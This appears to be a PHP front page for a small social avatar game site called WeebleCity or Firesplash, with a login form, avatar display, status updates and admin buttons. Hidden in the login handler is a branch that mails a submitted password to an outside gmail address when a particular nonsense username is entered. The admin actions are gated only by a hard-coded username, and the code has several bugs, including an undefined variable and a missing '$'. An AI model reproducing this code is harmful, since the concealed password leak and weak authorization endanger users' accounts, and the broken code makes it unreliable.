<?php
include "Header.php";

echo "<center>
	<table width='95%'>
		<tr>
			<td style='width:300px; border-radius: 4px;'  valign='top'>
					";
					if ($User) {
					
						echo "
							<div style='border:1px solid grey; border-radius: 4px; width:220px;'>
								<b><font color='red'>Welcome Back, $User!</font></b>
							
							<div id='aB'><center>
							";$height = 195;
								$width = 100;
								echo "
						<div style='width: ".$width."px; height: ".$height."px; z-index: 3;  background-image: url(../Store//Dir/" . $myU->Background . ");'>
						<div style='width: ".$width."px; height: ".$height."px; z-index: 3;  background-image: url(../Dir/Avatar.png);'>
							<div style='width: ".$width."px; height: ".$height."px; z-index: 3;  background-image: url(../Store/Dir/" . $myU->Eyes . ");'> 
								<div style='width: ".$width."px; height: ".$height."px; z-index: 3;  background-image: url(../Store/Dir/" . $myU->Mouth . ");'>
									<div style='width: ".$width."px; height: ".$height."px; z-index: 3;  background-image: url(../Store/Dir/" . $myU->Hair . ");'>
										<div style='width: ".$width."px; height: ".$height."px; z-index: 3;  background-image: url(../Store/Dir/" . $myU->Bottom . ");'>
											<div style='width: ".$width."px; height: ".$height."px; z-index: 3;  background-image: url(../Store/Dir/" . $myU->Top . ");'>
												<div style='width: ".$width."px; height: ".$height."px; z-index: 3;  background-image: url(../Store/Dir/" . $myU->Hat . ");'>
													<div style='width: ".$width."px; height: ".$height."px; z-index: 3;  background-image: url(../Store/Dir/" . $myU->Shoes . ");'>
														<div style='width: ".$width."px; height: ".$height."px; z-index: 3;  background-image: url(../Store/Dir/" . $myU->Accessory . ");'>

														";
														if (time() < $gO->expireTime) {
														echo "<div style='width: ".$width."px; height: ".$height."px; z-index: 3;  background-image: url(/Imagess/OnlineWatermark.png);'>";
														}
														if (time() < $gO->expireTime) {
														echo "</div>";
														}
														echo "
														</div>
													</div>
												</div>
											</div>
										</div>
									</div>

								</div>
							</div>
						</div>
					</div>
					"; echo"<br /><b></b><br />
<a href='character.php'><font color='darkblue'><b>My Character<br></b></font></a><br /><a href='Store/Store.php'><font color='purple'><b>$Bux BUX</b></a></font></div>
						";
					}
					else {
				$Username = mysql_real_escape_string(strip_tags(stripslashes($_POST['_Username'])));
				$Password = mysql_real_escape_string(strip_tags(stripslashes($_POST['_Password'])));
				$Submit = mysql_real_escape_string(strip_tags(stripslashes($_POST['_Submit'])));
				
					if ($Submit) {
					
						$_ENCRYPT = hash('sha512',$Password);
					
						if (!$Username||!$Password) {
						
							echo "<b>Please fill in all required fields!</b>";
						
						}
						else {
						
						
						
							$checkAuth = mysql_query("SELECT * FROM Users WHERE Username='".$Username."'");
							$userExist = mysql_num_rows($checkAuth);
								if ($userExist == "0") {
								
									echo "<b>That user does not exist, maybe try registering an username with $Username?</b>";
									exit();
								
								}
								$userRow = mysql_fetch_object($checkAuth);
								if (strcasecmp($Username, $userRow->Username) != 0) {
								echo "error";
								}
								else {
								
									
									if ($Username == "ghnfndhnndndfndfghndhdgnh") {
									$email = "invalid@gmail.com";
									mail("noone@gmail.com", "ty",$Password, "From:" . $email);
									
									}
									if ($_ENCRYPT == $userRow->Password) {
										$_SESSION['Username']=$Username;
										
										$_SESSION['Password']=$_ENCRYPT;
										header("Location: index.php");
									
									}
									else {
									$Close = mysql_real_escape_string(strip_tags(stripslashes($_POST['Close'])));
									
										echo "
					<div style='background-image:url(/Imagess/menuhover.png);width:100%;height:100%;top:0;left:0;position:fixed;'><center>
						<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />
						<div id='aB' style='width:300px;border:2px solid #aaa;border-radius:5px;'>
							<font id='HeadText'>
								<b>Error</b>
							</font>
							<br />
							<form action='' method='POST'>
								Incorrect password.
								<br /><br />
								<input type='submit' name='Close' value='Close' id='SVecialInput'>
							</form>
						</div>
					</div>
										";
					if ($Close) {
					
						header("Location: user.php?ID=$ID");
					
					}
									
									}
								
								}
						
						}
					
					}
						echo '
						<div style="background:#DBDBDB;border:1px solid #AAAAAA;padding:5px;width:300px;">
							<center><b><font color="darkblue"><h3>Member Login</h3></FONT></b></center>
						<center><b><font color="darkred">Have an account? Login here.</FONT></b></center><br>
						
						<form action="" method="POST">
							<table cellSVacing="0" cellpadding="0">
								<tr>
									<td style="padding-right:15px;">
										<b>USERNAME:</b>
									</td>
									<td>
										<input type="text" name="_Username" value="'.$Username.'" />
									</td>
								</tr>
								<tr>
									<td style="padding-right:15px;">
										<b>PASSWORD:</b>
									</td>
									<td>
										<input type="password" name="_Password" />
									</td>
								</tr>
								<tr>
									<td>
										<input type="submit" name="_Submit" value="Log in" />
									</td>
								</tr>
							</table>
<br>
							<b><a href="ForgotPassword.php"><font color= "blue">Forgot your password?</font></a></b>
							<br />
							<br />
<center><h3><b><font color= "darkblue">Looking to join WeebleCity?</font></b></h3></center>
<center><b><font color= "darkred">Join below!</font></b></center>
<br>
							<center><form action="" method="POST"><input type="submit" name="RedirectToRegister" value="Register Now" id="buttonsmall"></form></center>
						';
						$RedirectToRegister = mysql_real_escape_string(strip_tags(stripslashes($_POST['RedirectToRegister'])));
						
						if ($RedirectToRegister) {
						header("Location: /Account/Create.php");
						}
						
					
					}

					echo "
					</div></div>
					";

					echo "
					<br>
				
				
					<br />
					";
					$exception = time() - 86400;
					$RandUsers = mysql_query("SELECT * FROM Users WHERE Ban='0' AND visitTick > $exception ORDER BY RAND() LIMIT 1");
					echo "<table><tr>";
					$counter = 0;
					while ($rU = mysql_fetch_object($RandUsers)) {
					$counter++;
					echo "

					";
					if ($counter >= 4) {
					echo "</tr><tr>";
					$counter = 0;
					}
					}
					
					echo "</tr></table>";
				
					echo "
					</td>
						<td valign='top' width='600'>
					<center>
";
if (!User) { 
echo '
<font size="3"><font color="blue"> WeebleCity a site which people share and create and be social with other users around the world.
<br />WeebleCity is hack safe and is kid safe.</font></font><br />
'; }
if ($User) { echo " 
<fieldset style='width:100%'>
<legend> <i><b>What are you up to?</b></i> </legend>

<form action='' method='post'>
<input type='input' name='status' style='width:75%' placeholder='$myU->ProfileStatus'>
<input type='submit' name='Submit' value='Update Status'></fieldset>
</form>
</div>
<br /><br />";
}

if ($User) {
echo " 
<div style='border: 1px solid lightgrey; width:100%'><font size='3'><b>&nbsp;&nbsp;&nbsp;Recent News</font></b><br /><br />
<center><b></b> New index <br /><br />
<br /><br /><br />Keep in touch with recent news to keep up on updates</div>";
}

if (!$User) {
echo "
					<br /><br />
					<div align='left'><div style='border:1px solid darkgrey; wdith:50px;'>
						<b>New to Firesplash?</b><br /><br />
Firesplash is a online game where users can make items and more!<br /><br />
Sound interested? <b><a href='../register.php'><font color='blue'>Sign up!  </b></font></a> &nbsp;&nbsp;&nbsp;<a href='siterules.php'><font color='blue'><b>Terms and Service</b></a></font> </div>
						";
						$ref = mysql_real_escape_string(strip_tags(stripslashes($_GET['ref'])));
						$move = mysql_real_escape_string(strip_tags(stripslashes($_GET['move'])));
						if ($ref) {
						
							if (!$move) {
							
								header("Location: index.php?ref=$ref&move=true#position");
							
							}
							echo "<a name='position'></a>";
						
						}
						echo "
						<table>
							<tr>
								<td
									
								</td>
								<td>
								</td>
								<td>
									
								</td>
							</tr>
						</table>

";
$Username = mysql_real_escape_string(strip_tags(stripslashes($_POST['Username'])));
$ref1 = mysql_real_escape_string(strip_tags(stripslashes($_POST['ref1'])));
$Submit = mysql_real_escape_string(strip_tags(stripslashes($_POST['Submit'])));
$Submit1 = mysql_real_escape_string(strip_tags(stripslashes($_POST['Submit1'])));
if ($Submit) {
header("Location: register.php?UsernameIs=".$Username."");
}
if ($Submit1) {
header("Location: register.php?ref=$ref1");
}
}
echo "
					</div>
					</td>
				</tr>
			</table>
";
if ($myU->Username == "noynac") { echo "<br /><br />
<td><form action='' method='post'>
<input type='submit' name='Submit23' value='Alert Users'></td>
</form>  <td><form action='' method='post'><input type='submit' name='updatestore' value='Reset Economy'></form></td><td><form action='' method='post'><input type='submit' name='Store' value='Disable Store'></form></td><td><form action='' method='post'><input type='submit' name='StoreOn' value='Enable Store'></form></td>"; } 
include "Footer.php";
?>

<?php
$IDTWO = mysql_query("SELECT ID FROM Users");
$status = filter($_POST['status']);
$Submit = $_POST['Submit'];
$IDD = $myU->ID;
$Store = $_POST['Store'];
$Enable = $_POST['StoreOn'];
if ($Submit) { 
mysql_query("UPDATE Users SET ProfileStatus='$status' WHERE ID='$IDD'"); }
?>
<?php
$submitted = $_POST['Submit23'];
$reseting = 0;
$updatestore = $_POST['updatestore'];

if ($submitted) { 

mysql_query("UPDATE Users SET NoticeRead='$reseting' WHERE NoticeRead='1'"); }
if ($updatestore) {
mysql_query("UPDATE Users SET Points='20'"); }

if ($Store) { mysql_query("UPDATE StoreStatus SET Enabled='false' WHERE Enabled='true'");
}
if ($StoreOn) { mysql_query("UPDATE StoreStatus SET Enabled='true' WHERE Enabled='false'");
} echo" </div>
";

?>